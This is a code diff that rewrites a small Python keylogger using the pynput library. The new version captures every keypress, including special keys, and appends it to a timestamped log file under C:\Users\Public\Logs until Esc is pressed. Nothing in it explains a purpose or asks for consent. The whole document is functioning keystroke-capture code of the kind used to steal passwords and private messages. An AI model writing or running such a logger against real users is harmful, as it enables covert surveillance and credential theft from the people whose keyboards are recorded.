@@ -1,26 +1,26 @@
-import pynput
-from pynput.keyboard import Key, Listener
+from pynput import keyboard
+import os
+from datetime import datetime
 
-count = 0
-Keys = []
+log_dir = "C:\\Users\\Public\\Logs"
+if not os.path.exists(log_dir):
+    os.makedirs(log_dir)
+
+log_file = os.path.join(log_dir, f"log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
+
+def write_to_file(text):
+    with open(log_file, "a") as f:
+        f.write(text + "\n")
 
 def on_press(key):
-    global Keys, count
-    print("{0} Pressed".format(key))
-
-def write_file(keys):
-    with open("log.txt", "a") as f:
-        for key in Keys:
-            f.write(key)
-            k = str(key).replace("'", "")
-            if k.find("space") > 0:
-                f.write('\n')
-            elif k.find("Key") == -1:
-                f.write(k)
+    try:
+        write_to_file(f"{key.char}")
+    except AttributeError:
+        write_to_file(f"[{key}]")
 
 def on_release(key):
-    if key == Keys.esc:
+    if key == keyboard.Key.esc:
         return False
-    
-with Listener(on_press=on_press, on_release=on_release) as listener:
+
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
